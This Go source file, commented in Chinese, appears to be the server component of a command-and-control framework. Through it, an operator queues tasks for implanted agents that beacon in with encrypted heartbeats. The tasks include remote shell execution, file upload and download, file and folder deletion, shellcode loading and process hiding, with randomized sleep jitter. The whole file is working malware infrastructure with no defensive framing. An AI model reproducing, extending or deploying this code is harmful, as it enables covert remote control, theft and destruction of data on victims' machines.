package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

func main() {
	r := gin.New()

	// type_operation["shell"] = []string{"exec", "stop"}
	// type_operation["file"] = []string{"dir", "del_file", "del_folder", "upload", "download", "mkdir", "rename", "list_drivers", "stop"}
	// type_operation["client"] = []string{"load"}
	// type_operation["process"] = []string{"process", "stop"}
	// type_operation["process2"] = []string{"process", "stop"}
	// type_operation["process3"] = []string{"process", "stop"}
	// type_operation["process4"] = []string{"process", "stop"}
	// type_operation["hideprocess"] = []string{"process", "stop"}

	// ShellStatus["file"] = false
	// ShellStatus["shell"] = false
	// ShellStatus["process"] = false
	// ShellStatus["process"] = false
	// ShellStatus["process"] = false
	// ShellStatus["process"] = false
	// ShellStatus["hideprocess"] = false

	tasks_buff = make(map[string]string)

	// // fmt.Println("命令行参数", os.Args)
	// password = os.Args[1]

	// 简单的身份认证
	r.POST("/login", func(c *gin.Context) {
		content, _ := ioutil.ReadAll(c.Request.Body)

		if string(content) == password {

			c.String(http.StatusOK, "success")
		} else {
			c.String(http.StatusOK, "failed")
		}
		log.Println("login server")
	})

	// 用来和agent交互
	r.POST("/", func(c *gin.Context) {
		// 获取源ip
		client_ip := c.ClientIP()

		// 获取源post data

		content, _ := ioutil.ReadAll(c.Request.Body)

		// 对post data进行解密
		// fmt.Println(string(content))
		tmp := decrypt(string(content))
		// fmt.Println(tmp)

		// 处理/r,/n
		tmp = strings.ReplaceAll(tmp, "\r", "#$%^$")
		tmp = strings.ReplaceAll(tmp, "\n", "#$%^&")
		tmp = strings.ReplaceAll(tmp, "\t", "#$%^*")
		tmp = strings.ReplaceAll(tmp, `\`, `/`)

		if strings.Contains(tmp, `"data":"`) && strings.Contains(tmp, `","status"`) {
			left := strings.Index(tmp, `"data":"`)
			right := strings.Index(tmp, `","status"`)
			change := strings.ReplaceAll(tmp[left+8:right], `"`, ``)
			tmp = strings.ReplaceAll(tmp, tmp[left+8:right], change)
		}

		clear_text := []byte(tmp)

		// 将string转换为json
		var session Agent_Session
		// fmt.Println(string(clear_text))
		if err := json.Unmarshal(clear_text, &session); err == nil {
			if len(session.Operation) > 0 {
				log.Println("被控端ip地址：", client_ip)
				log.Printf("被控端发送的数据：%c[1;40;32m%s%c[0m\n", 0x1B, tmp, 0x1B)
				fmt.Println("==================================================================================================================================")
			}

			// 维护session list
			session_list_key := client_ip + "_" + session.Hostname + "_" + session.Type
			last_time := strconv.FormatInt(time.Now().Unix(), 10)
			// 加锁
			session_list.Lock()
			for k := range session_list.m {
				tmp := strings.Split(k, "_")
				if tmp[0] == client_ip && tmp[1] == session.Hostname {
					delete(session_list.m, k)
				}
			}
			session_list.m[session_list_key] = last_time

			session_list.Unlock()
			switch {
			case session.Operation == "exec":
				Shell_exec(client_ip, clear_text)
			case session.Operation == "dir":
				File_dir(client_ip, clear_text)
			case session.Operation == "del_file":
				File_del_file(client_ip, clear_text)
			case session.Operation == "del_folder":
				File_del_folder(client_ip, clear_text)
			case session.Operation == "upload":
				File_upload(client_ip, clear_text)
			case session.Operation == "download":
				File_download(client_ip, clear_text)
			case session.Operation == "mkdir":
				File_mkdir(client_ip, clear_text)
			case session.Operation == "rename":
				File_rename(client_ip, clear_text)
			case session.Operation == "sleep":
				Agent_sleep()
			case session.Operation == "list_drivers":
				File_list_drivers(client_ip, clear_text)
			case session.Operation == "process":
				Process()
			case session.Operation == "":
				// 心跳
				globalModule = session.Type

				if len(tasks[string(client_ip)]) > 0 {
					log.Println("task列表的任务：", tasks[client_ip])
					resp := get_task(client_ip, session.Hostname)

					c.Header("Content-Length", strconv.Itoa(len(encrypt(resp))))
					c.String(http.StatusOK, encrypt(resp))

					// 从task列表中删除该任务
					tasks[client_ip] = tasks[client_ip][1:]
					log.Println("被控端心跳包ip地址：", client_ip)
					log.Printf("发送给被控端的数据：%c[1;40;32m%s%c[0m\n", 0x1B, resp, 0x1B)
					log.Println("task列表的任务：", tasks[client_ip])
					fmt.Println("==================================================================================================================================")
					// loadshellcode 由于没有返回值 所以不列入任务中
					if strings.Contains(tmp, `"operation":"load"`) || strings.Contains(tmp, `"operation":"process"`) || strings.Contains(tmp, `"operation":"stop"`) || strings.Contains(tmp, `"operation":"hideprocess"`) {
						return
					} else {
						// 向task_send列表中加入该任务
						tasks_send[client_ip] = append(tasks_send[client_ip], tmp)
					}
					return
				}
			}

		} else {
			log.Println("json err：", err)
		}
		unix_time := strconv.FormatInt(time.Now().Unix(), 10)
		key := client_ip + "_" + session.Hostname

		if _, ok := sleep_time[key]; ok {
			// sleep_time中存在该key
			resp := "type=client&&operation=alive&&sleep=" + sleep_time[key] + "." + strconv.Itoa(rand.Intn(9)) + "&&timestamp=" + unix_time
			c.String(http.StatusOK, encrypt(resp))
		} else {
			// sleep_time中不存在该key
			resp := "type=client&&operation=alive&&sleep=1." + strconv.Itoa(rand.Intn(9)) + "&&timestamp=" + unix_time
			c.String(http.StatusOK, encrypt(resp))
		}

	})

	// 用来和task进行交互
	r.POST("/task", func(c *gin.Context) {
		content, _ := ioutil.ReadAll(c.Request.Body)

		log.Println("客户端ip地址：", c.ClientIP())
		log.Printf("客户端发送的数据：%c[1;40;32m%s%c[0m\n", 0x1B, string(content), 0x1B)
		fmt.Println("==================================================================================================================================")
		var task Task
		if err := json.Unmarshal(content, &task); err == nil {

			if task.Type != "" {
				switch {
				case task.Operation == "load":
					var load Post_Load
					if err := json.Unmarshal(content, &load); err == nil {

						// 判断shellcode是否重复加载
						time.Sleep(time.Duration(3) * time.Second)
						if strings.Contains(globalModule, load.Type) {
							c.String(http.StatusOK, "%s has load", load.Type)
							log.Printf("load发送给客户端的数据：%c[1;40;32m%s%c[0m\n", 0x1B, load.Type+" has load", 0x1B)
							fmt.Println("==================================================================================================================================")
							return
						}

						trans_load(load, task.IP)
						if load.Type == "shell" {

							key := task.IP + "_" + task.Hostname + "_" + "exec"
							for {
								if exec_data.m[key] != "" {

									backToClient(c, key)
									return
								}
							}
						}
						return

					}
				case task.Operation == "exec":
					var exec Post_Exec
					if err := json.Unmarshal(content, &exec); err == nil {

						trans_exec(exec, task.IP)
						// 等待返回结果
						key := task.IP + "_" + task.Hostname + "_" + task.Operation
						for {
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "dir":
					var dir Post_Dir
					if err := json.Unmarshal(content, &dir); err == nil {

						dir.Data = strings.ReplaceAll(dir.Data, `\`, `/`)
						trans_exec(dir, task.IP)

						for {
							// key := task.IP+"_"+dir.Hostname+"_"+dir.Operation+"_"+dir.Data
							key := task.IP + "_" + dir.Hostname + "_" + "dir"
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "del_file":
					var del_file Post_Del_File
					if err := json.Unmarshal(content, &del_file); err == nil {

						trans_exec(del_file, task.IP)
						// 等待返回结果
						for {
							// key := task.IP + "_" + del_file.Hostname + "_" + del_file.Operation + "_" + del_file.Data
							key := task.IP + "_" + del_file.Hostname + "_" + "del_file"
							key = strings.ReplaceAll(key, `\`, `/`)

							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "del_folder":
					var del_folder Post_Del_File
					if err := json.Unmarshal(content, &del_folder); err == nil {

						trans_exec(del_folder, task.IP)
						// 等待返回结果
						for {
							// key := task.IP + "_" + del_folder.Hostname + "_" + del_folder.Operation + "_" + del_folder.Data
							key := task.IP + "_" + del_folder.Hostname + "_" + "del_folder"
							key = strings.ReplaceAll(key, `\`, `/`)
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "upload":
					var upload Post_Upload
					if err := json.Unmarshal(content, &upload); err == nil {

						trans_exec(upload, task.IP)
						// 等待返回结果
						for {
							// key := task.IP + "_" + upload.Hostname + "_" + upload.Operation + "_" + upload.File_Name
							key := task.IP + "_" + upload.Hostname + "_" + "upload"
							key = strings.ReplaceAll(key, `\`, `/`)
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "download":
					var download Post_Download
					if err := json.Unmarshal(content, &download); err == nil {

						trans_exec(download, task.IP)
						for {
							// key := task.IP + "_" + download.Hostname + "_" + download.Operation + "_" + download.File_Name
							key := task.IP + "_" + download.Hostname + "_" + "download"
							key = strings.ReplaceAll(key, `\`, `/`)
							if exec_data.m[key] != "" {
								c.String(http.StatusOK, exec_data.m[key])
								exec_data.m[key] = ""
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "mkdir":
					var mkdir Post_Mkdir
					if err := json.Unmarshal(content, &mkdir); err == nil {

						trans_exec(mkdir, task.IP)
						for {
							// key := task.IP + "_" + mkdir.Hostname + "_" + mkdir.Operation + "_" + mkdir.Data
							key := task.IP + "_" + mkdir.Hostname + "_" + "mkdir"
							key = strings.ReplaceAll(key, `\`, `/`)
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "rename":
					var rename Post_Rename
					if err := json.Unmarshal(content, &rename); err == nil {

						trans_exec(rename, task.IP)
						for {
							// key := task.IP + "_" + rename.Hostname + "_" + rename.Operation + "_" + rename.Old_Name
							key := task.IP + "_" + rename.Hostname + "_" + "rename"
							key = strings.ReplaceAll(key, `\`, `/`)

							if exec_data.m[key] != "" {
								c.String(http.StatusOK, exec_data.m[key])

								// 需要将该任务的exec_data 删除或者置为空
								//exec_data[task.IP+"_"+mkdir.Hostname+"_"+mkdir.Operation+"_"+mkdir.Data] = ""
								exec_data.m[key] = ""
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "list_drivers":
					var list_drivers Post_List_Drivers
					if err := json.Unmarshal(content, &list_drivers); err == nil {

						trans_exec(list_drivers, task.IP)
						for {
							// key:=task.IP+"_"+list_drivers.Hostname+"_"+list_drivers.Operation
							key := task.IP + "_" + list_drivers.Hostname + "_" + "list_drivers"
							if exec_data.m[key] != "" {
								backToClient(c, key)
								return
							}
							time.Sleep(time.Duration(1) * time.Second)
						}
					}
				case task.Operation == "process" || task.Operation == "hideprocess":
					var process Post_Process
					if err := json.Unmarshal(content, &process); err == nil {

						trans_exec(process, task.IP)
						c.String(http.StatusOK, "success")
					}
				case task.Operation == "sleep":
					var sleep Post_Sleep
					if err := json.Unmarshal(content, &sleep); err == nil {
						key := task.IP + "_" + sleep.Hostname
						sleep_time[key] = sleep.Data
						c.String(http.StatusOK, "success")
					}
				case task.Operation == "stop":
					var stop Post_Stop
					if err := json.Unmarshal(content, &stop); err == nil {
						trans_exec(stop, task.IP)
						c.String(http.StatusOK, "success")
					}
				default:
					c.String(http.StatusBadRequest, "没有此类型的操作")
				}
			} else {
				c.String(http.StatusOK, "type is null")
				return
			}
		}
	})

	// 获取session list
	r.POST("/list", func(c *gin.Context) {
		c.String(http.StatusOK, "{")
		i := 1
		for k, v := range session_list.m {
			if i == len(session_list.m) {
				c.String(http.StatusOK, `"`+k+`":"`+v+`"`)
			} else {
				c.String(http.StatusOK, `"`+k+`":"`+v+`",`)
			}
			i = i + 1
		}
		c.String(http.StatusOK, "}")

	})

	if err := r.Run("0.0.0.0:80"); err != nil {
		fmt.Println("server start faile")
	}
}

func backToClient(c *gin.Context, key string) {
	exec_data.Lock()
	exec_data.m[key] = strings.ReplaceAll(exec_data.m[key], "#$%^$", "\r")
	exec_data.m[key] = strings.ReplaceAll(exec_data.m[key], "#$%^&", "\n")
	exec_data.m[key] = strings.ReplaceAll(exec_data.m[key], "#$%^*", "\t")
	exec_data.m[key] = strings.ReplaceAll(exec_data.m[key], `/`, `\`)
	c.String(http.StatusOK, exec_data.m[key])
	log.Println(key)
	log.Printf("发送给客户端的数据：%c[1;40;32m%s%c[0m\n", 0x1B, exec_data.m[key], 0x1B)
	fmt.Println("==================================================================================================================================")
	delete(exec_data.m, key)
	exec_data.Unlock()
}
